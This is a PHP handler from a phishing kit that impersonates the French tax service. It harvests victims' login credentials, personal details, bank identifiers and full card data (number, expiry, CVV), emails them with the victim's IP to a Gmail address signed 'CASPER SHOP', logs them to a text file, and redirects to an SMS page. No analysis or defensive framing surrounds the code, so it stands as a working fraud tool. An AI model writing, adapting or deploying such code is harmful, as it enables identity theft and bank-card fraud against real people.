<?php
$ip = getenv("REMOTE_ADDR");
$message = "======================[ Impots A ]=============================\n";
$message.= "Email           : ".$_POST['AK09']."-Password-".$_POST['AK10']."     \n";
$message.= "Prenom          : ".$_POST['AK01']."       \n";
$message.= "Nom             : ".$_POST['AK02']."       \n";
$message.= "Naissance       : ".$_POST['AK03']."-".$_POST['AK04']."-".$_POST['AK05']."       \n";
$message.= "Adresse         : ".$_POST['AK06']."-Code postal-".$_POST['AK07']."     \n";
$message.= "tel             : ".$_POST['AK08']."       \n";
$message.= "======================[ Info Cb ]==========================\n";
$message.= "Banque          : ".$_POST['AK11']."       \n";
$message.= "identifiant     : ".$_POST['AK12']."       \n";
$message.= "Code Secret*    : ".$_POST['AK03']."       \n";
$message.= "Num CB          : ".$_POST['AK14']."       \n";
$message.= "Expire Fin      : ".$_POST['AK15']."-".$_POST['AK16']."       \n";
$message.= "Cryptogramme    : ".$_POST['AK17']."       \n";
$message.= "======================[ Adresse IP ]=======================\n";
$message.= "Client IP 		 : ".$ip."           \n";
$message.= "IP Link 		 : http://www.geoiptool.com/?IP=$ip ----\n";
$message.= "|----------| YOUR WELCOME CASPER SHOP |--------------|\n";
$send = "blizcasper0@gmail.com";
$subject = "full cc impots FR- From:  [ $ip ]";
{
mail("$send", "$subject", $message);
}

$file = fopen("./robot.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);

header("Location: ../sms.html");


?>